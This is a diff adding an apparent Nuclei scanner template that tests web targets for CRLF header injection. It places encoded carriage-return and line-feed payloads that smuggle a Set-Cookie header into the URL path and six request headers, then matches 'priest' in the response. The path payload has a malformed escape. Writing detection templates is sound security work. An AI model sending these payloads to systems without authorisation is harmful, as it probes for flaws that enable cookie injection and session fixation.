@@ -1,0 +1,39 @@
+id: INFO-Header-SET-COOKIE
+
+info:
+  name: INFO Header SET COOKIE
+  author: priest
+  severity: info
+  description: Informational Set-Cookie Header Misconfiguration
+  tags: header
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/%0d%0aset-cookie%20%neural%3dpriest74321;%20domain%20%3d.{{randstr}}.neuralpriest.com"
+
+    redirects: true
+    max-redirects: 5
+
+    headers:
+
+      User-Agent: "Mozilla priest74321%0d%0ASet-Cookie: priestCookie=74321UA; path=/; secure; httponly"
+      X-Forwarded-For: "0.0.0.0%0d%0ASet-Cookie: priestCookie=74321XFF; path=/; secure; httponly"
+      X-Forwarded-Host: "0.0.0.0%0d%0ASet-Cookie: priestCookie=74321XFH; path=/; secure; httponly"
+      Referer: "google.com%0d%0ASet-Cookie: priestCookie=74321XR; path=/; secure; httponly"
+      Cookie: "neural=priest74321%0d%0ASet-Cookie: priestCookie=74321XC; path=/; secure; httponly"
+      Origin: "priest74321.com%0d%0ASet-Cookie: priestCookie=74321XO; path=/; secure; httponly"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - ".*?(p|P)(r|R)(i|I)(e|E)(s|S)(t|T).*?"
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - ".*?(p|P)(r|R)(i|I)(e|E)(s|S)(t|T).*?[\r\n]"
